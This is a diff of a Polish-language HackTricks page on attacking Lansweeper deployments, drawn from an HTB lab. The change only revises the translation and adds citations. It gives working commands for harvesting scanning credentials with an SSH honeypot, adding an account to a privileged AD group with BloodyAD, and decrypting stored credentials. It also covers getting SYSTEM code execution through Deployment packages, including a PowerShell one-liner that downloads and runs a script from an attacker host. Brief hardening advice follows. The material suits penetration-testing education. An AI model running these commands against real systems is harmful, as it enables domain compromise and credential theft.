@@ -1,30 +1,30 @@
-# Wykorzystanie Lansweeper: pozyskiwanie poświadczeń, odszyfrowywanie sekretów i Deployment RCE
+# Lansweeper Abuse: Pozyskiwanie danych uwierzytelniających, deszyfrowanie sekretów i RCE przez Deployment
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Lansweeper to platforma do odkrywania i inwentaryzacji zasobów IT powszechnie wdrażana na Windows i zintegrowana z Active Directory. Poświadczenia skonfigurowane w Lansweeper są używane przez jego silniki skanujące do uwierzytelniania się na zasobach przez protokoły takie jak SSH, SMB/WMI i WinRM. Błędne konfiguracje często pozwalają na:
+Lansweeper to platforma do wykrywania i inwentaryzacji zasobów IT, często wdrażana w systemie Windows i integrowana z Active Directory. Dane uwierzytelniające skonfigurowane w Lansweeper są używane przez jego silniki skanujące do uwierzytelniania zasobów za pośrednictwem protokołów takich jak SSH, SMB/WMI i WinRM. Błędne konfiguracje często umożliwiają:
 
-- Przechwycenie poświadczeń poprzez przekierowanie celu skanowania na host kontrolowany przez atakującego (honeypot)
-- Nadużycie AD ACLs ujawnionych przez grupy związane z Lansweeper w celu uzyskania zdalnego dostępu
-- Odszyfrowanie na hoście sekretów skonfigurowanych w Lansweeper (connection strings oraz zapisane scanning credentials)
-- Wykonanie kodu na zarządzanych punktach końcowych przez funkcję Deployment (często uruchamianą jako SYSTEM)
+- Przechwytywanie danych uwierzytelniających przez przekierowanie celu skanowania do hosta kontrolowanego przez atakującego (honeypot)
+- Wykorzystanie AD ACLs ujawnionych przez grupy powiązane z Lansweeper w celu uzyskania zdalnego dostępu
+- Deszyfrowanie sekretów skonfigurowanych w Lansweeper na hoście (connection strings i przechowywane dane uwierzytelniające skanowania)
+- Wykonywanie kodu na zarządzanych endpointach za pośrednictwem funkcji Deployment (często z uprawnieniami SYSTEM)
 
-Ta strona podsumowuje praktyczne scenariusze atakującego i polecenia do nadużycia tych zachowań podczas engagementów.
+Ta strona podsumowuje praktyczne workflow atakującego i polecenia służące do wykorzystania tych zachowań podczas engagementów.
 
-## 1) Pozyskiwanie scanning credentials przez honeypot (przykład SSH)
+## 1) Pozyskiwanie danych uwierzytelniających skanowania za pomocą honeypot (przykład SSH)
 
-Idea: utwórz Scanning Target wskazujący na twój host i przypisz do niego istniejące Scanning Credentials. Gdy skan się uruchomi, Lansweeper spróbuje uwierzytelnić się za pomocą tych poświadczeń, a twój honeypot je przechwyci.
+Pomysł: utwórz Scanning Target wskazujący na Twój host i przypisz do niego istniejące Scanning Credentials. Po uruchomieniu skanowania Lansweeper spróbuje uwierzytelnić się za pomocą tych danych, a Twój honeypot je przechwyci.<sup>[[1]](#references)</sup>
 
-Przegląd kroków (interfejs webowy):
+Przegląd kroków (web UI):
 - Scanning → Scanning Targets → Add Scanning Target
-- Type: IP Range (or Single IP) = your VPN IP
-- Skonfiguruj port SSH na coś osiągalnego (np. 2022 jeśli 22 jest zablokowany)
-- Wyłącz harmonogram i uruchom skan ręcznie
-- Scanning → Scanning Credentials → upewnij się, że istnieją Linux/SSH creds; przypisz je do nowego targetu (włącz wszystkie według potrzeby)
-- Kliknij “Scan now” na targetcie
-- Uruchom SSH honeypot i pozyskaj próbowaną nazwę użytkownika/hasło
+- Type: IP Range (lub Single IP) = Twój adres IP VPN
+- Skonfiguruj port SSH na osiągalny (np. 2022, jeśli 22 jest zablokowany)
+- Wyłącz harmonogram i zaplanuj ręczne uruchomienie
+- Scanning → Scanning Credentials → upewnij się, że istnieją dane uwierzytelniające Linux/SSH; przypisz je do nowego celu (w razie potrzeby włącz wszystkie)
+- Kliknij „Scan now” na celu
+- Uruchom honeypot SSH i pobierz próbę użycia nazwy użytkownika/hasła
 
-Przykład z sshesame:
+Przykład z użyciem sshesame:<sup>[[2]](#references)</sup>
 ```yaml
 # sshesame.conf
 server:
@@ -46,15 +46,15 @@ netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Notatki
-- Działa podobnie dla innych protokołów, gdy możesz zmusić scanner do połączenia się z twoim listenerem (SMB/WinRM honeypots itp.). SSH jest często najprostszy.
-- Wiele scannerów identyfikuje się poprzez charakterystyczne banery klienta (np. RebexSSH) i spróbuje wykonać nieszkodliwe polecenia (uname, whoami itp.).
+Uwagi
+- Działa podobnie w przypadku innych protokołów, gdy można wymusić, aby scanner łączył się z naszym listenerem (honeypoty SMB/WinRM itp.). SSH jest często najprostszym rozwiązaniem.
+- Wiele scannerów identyfikuje się za pomocą charakterystycznych bannerów klienta (np. RebexSSH) i wykonuje nieszkodliwe polecenia (uname, whoami itp.).
 
-## 2) AD ACL abuse: uzyskaj zdalny dostęp dodając siebie do app-admin group
+## 2) Nadużycie AD ACL: uzyskanie zdalnego dostępu przez dodanie siebie do grupy app-admin
 
-Użyj BloodHound, aby wyenumerować effective rights z kompromitowanego konta. Częste znalezisko to grupa specyficzna dla scannera lub aplikacji (np. “Lansweeper Discovery”), posiadająca GenericAll nad uprzywilejowaną grupą (np. “Lansweeper Admins”). Jeśli uprzywilejowana grupa jest także członkiem “Remote Management Users”, WinRM staje się dostępny po dodaniu siebie.
+Użyj BloodHound do wyliczenia efektywnych uprawnień skompromitowanego konta. Częstym znaleziskiem jest grupa powiązana ze scannerem lub aplikacją (np. „Lansweeper Discovery”) posiadająca GenericAll nad uprzywilejowaną grupą (np. „Lansweeper Admins”). Jeśli uprzywilejowana grupa jest również członkiem „Remote Management Users”, WinRM stanie się dostępny po dodaniu siebie do tej grupy.<sup>[[1]](#references)[[5]](#references)</sup>
 
-Collection examples:
+Przykłady zbierania danych:
 ```bash
 # NetExec collection with LDAP
 netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>
@@ -62,7 +62,7 @@ netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhoun
 # RustHound-CE collection (zip for BH CE import)
 rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
 ```
-Exploit GenericAll na grupie za pomocą BloodyAD (Linux):
+Wykorzystanie GenericAll na grupie za pomocą BloodyAD (Linux):<sup>[[4]](#references)</sup>
 ```bash
 # Add our user into the target group
 bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
@@ -71,24 +71,24 @@ add groupMember "Lansweeper Admins" svc_inventory_lnx
 # Confirm WinRM access if the group grants it
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Następnie uzyskaj interaktywny shell:
+Następnie uzyskaj interaktywną powłokę:
 ```bash
 evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Wskazówka: operacje Kerberos są wrażliwe na czas. Jeśli napotkasz KRB_AP_ERR_SKEW, najpierw zsynchronizuj czas z DC:
+Wskazówka: Operacje Kerberos są zależne od czasu. Jeśli napotkasz KRB_AP_ERR_SKEW, najpierw zsynchronizuj czas z kontrolerem domeny:
 ```bash
 sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
 ```
-## 3) Odszyfruj sekrety skonfigurowane przez Lansweeper na hoście
+## 3) Odszyfrowywanie sekretów skonfigurowanych w Lansweeper
 
-Na serwerze Lansweeper strona ASP.NET zwykle przechowuje zaszyfrowany connection string oraz klucz symetryczny używany przez aplikację. Mając odpowiedni dostęp lokalny, możesz odszyfrować ciąg połączenia DB i następnie wydobyć przechowywane poświadczenia skanowania.
+Na serwerze Lansweeper witryna ASP.NET zazwyczaj przechowuje zaszyfrowany ciąg połączenia oraz klucz symetryczny używany przez aplikację. Przy odpowiednim dostępie lokalnym można odszyfrować ciąg połączenia z bazą danych, a następnie wyodrębnić zapisane poświadczenia skanowania.<sup>[[1]](#references)</sup>
 
 Typowe lokalizacje:
-- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
+- Konfiguracja witryny: `C:\Program Files (x86)\Lansweeper\Website\web.config`
 - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
-- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
+- Klucz aplikacji: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
 
-Użyj SharpLansweeperDecrypt, aby zautomatyzować odszyfrowanie i wydobycie przechowywanych creds:
+Użyj SharpLansweeperDecrypt, aby zautomatyzować odszyfrowywanie i zrzucanie zapisanych poświadczeń:<sup>[[3]](#references)</sup>
 ```powershell
 # From a WinRM session or interactive shell on the Lansweeper host
 # PowerShell variant
@@ -99,24 +99,24 @@ powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
 #  - Connect to Lansweeper DB
 #  - Decrypt stored scanning credentials and print them in cleartext
 ```
-Oczekiwany wynik zawiera szczegóły połączeń DB oraz plaintext poświadczenia do skanowania, takie jak konta Windows i Linux używane w całym środowisku. Często mają one podwyższone uprawnienia lokalne na hostach domenowych:
+Oczekiwany wynik zawiera szczegóły połączenia z bazą danych oraz poświadczenia skanowania w postaci plaintext, takie jak konta Windows i Linux używane w całym środowisku. Często mają one podwyższone uprawnienia lokalne na hostach domenowych:
 ```text
 Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
 Inventory Linux    svc_inventory_lnx        <StrongPassword!>
 ```
-Wykorzystaj odzyskane Windows scanning creds do uzyskania uprzywilejowanego dostępu:
+Wykorzystaj odzyskane dane uwierzytelniające do skanowania Windows w celu uzyskania uprzywilejowanego dostępu:
 ```bash
 netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 # Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
 ```
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
-Jako członek „Lansweeper Admins”, interfejs webowy udostępnia Deployment i Configuration. W sekcji Deployment → Deployment packages możesz tworzyć pakiety, które uruchamiają dowolne polecenia na docelowych zasobach. Wykonanie jest przeprowadzane przez Lansweeper service z wysokimi uprawnieniami, co skutkuje wykonaniem kodu jako NT AUTHORITY\SYSTEM na wybranym hoście.
+As a member of “Lansweeper Admins”, interfejs webowy udostępnia sekcje Deployment i Configuration. W sekcji Deployment → Deployment packages można tworzyć pakiety uruchamiające dowolne polecenia na wskazanych assetach. Wykonanie jest realizowane przez usługę Lansweeper z wysokimi uprawnieniami, co zapewnia code execution jako NT AUTHORITY\SYSTEM na wybranym hoście.<sup>[[1]](#references)</sup>
 
-Główne kroki:
-- Utwórz nowy Deployment package, który uruchamia jednowierszowy skrypt PowerShell lub cmd (reverse shell, add-user, itp.).
-- Wybierz docelowy zasób (np. DC/host, na którym działa Lansweeper) i kliknij Deploy/Run now.
-- Odbierz swój shell jako SYSTEM.
+Najważniejsze kroki:
+- Utwórz nowy pakiet Deployment uruchamiający one-liner PowerShell lub cmd (reverse shell, add-user itd.).
+- Wskaż żądany asset (np. DC/host, na którym działa Lansweeper) i kliknij Deploy/Run now.
+- Odbierz shell jako SYSTEM.
 
 Przykładowe payloady (PowerShell):
 ```powershell
@@ -127,27 +127,27 @@ powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
 ```
 OPSEC
-- Operacje wdrożeniowe są głośne i pozostawiają wpisy w logach Lansweeper oraz w dziennikach zdarzeń Windows. Używaj rozważnie.
+- Działania wdrożeniowe są głośne i pozostawiają logi w Lansweeper oraz logach zdarzeń systemu Windows. Używaj ich rozważnie.
 
-## Wykrywanie i utwardzanie
+## Wykrywanie i hardening
 
-- Ogranicz lub usuń anonimowe enumeracje SMB. Monitoruj RID cycling i anomalne dostępy do udostępnień Lansweeper.
-- Kontrole ruchu wychodzącego: blokuj lub ściśle ogranicz ruch wychodzący SSH/SMB/WinRM z hostów skanujących. Generuj alerty przy niestandardowych portach (np. 2022) i nietypowych banerach klienta, takich jak Rebex.
-- Chroń `Website\\web.config` oraz `Key\\Encryption.txt`. Przenieś sekrety do vault i rotuj je po ekspozycji. Rozważ konta usługowe z minimalnymi uprawnieniami oraz gMSA tam, gdzie to możliwe.
-- Monitorowanie AD: generuj alerty przy zmianach w grupach związanych z Lansweeper (np. “Lansweeper Admins”, “Remote Management Users”) oraz przy zmianach ACL przyznających GenericAll/Write lub umożliwiających modyfikację członkostwa w grupach uprzywilejowanych.
-- Audytuj tworzenie/zmiany/wykonywanie pakietów Deployment; generuj alerty dla pakietów uruchamiających cmd.exe/powershell.exe lub nawiązujących nieoczekiwane połączenia wychodzące.
+- Ogranicz lub usuń anonimowe enumeracje SMB. Monitoruj RID cycling oraz anomalous access do udziałów Lansweeper.
+- Kontrola ruchu wychodzącego: blokuj lub ściśle ogranicz wychodzące połączenia SSH/SMB/WinRM z hostów skanujących. Generuj alerty dla niestandardowych portów (np. 2022) oraz nietypowych bannerów klienta, takich jak Rebex.
+- Chroń `Website\\web.config` oraz `Key\\Encryption.txt`. Przenieś sekrety do vaulta i rotuj je po exposure. Rozważ konta usługowe z minimalnymi uprawnieniami oraz gMSA, jeśli jest to możliwe.
+- Monitorowanie AD: generuj alerty dotyczące zmian w grupach powiązanych z Lansweeper (np. „Lansweeper Admins”, „Remote Management Users”) oraz zmian ACL przyznających GenericAll/Write membership w uprzywilejowanych grupach.
+- Audytuj tworzenie, zmiany i wykonywanie pakietów Deployment; generuj alerty dla pakietów uruchamiających cmd.exe/powershell.exe lub nawiązujących nieoczekiwane połączenia wychodzące.
 
 ## Powiązane tematy
-- SMB/LSA/SAMR enumeration i RID cycling
-- Kerberos password spraying i uwzględnienie rozbieżności czasu (clock skew)
+- Enumeracja SMB/LSA/SAMR oraz RID cycling
+- Kerberos password spraying oraz kwestie związane z clock skew
 - Analiza ścieżek BloodHound dla grup application-admin
-- Wykorzystanie WinRM i lateral movement
+- Użycie WinRM oraz lateral movement
 
 ## Referencje
-- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
-- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
-- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
-- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
-- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
+- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
+- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
+- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
+- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
 
 {{#include ../../banners/hacktricks-training.md}}
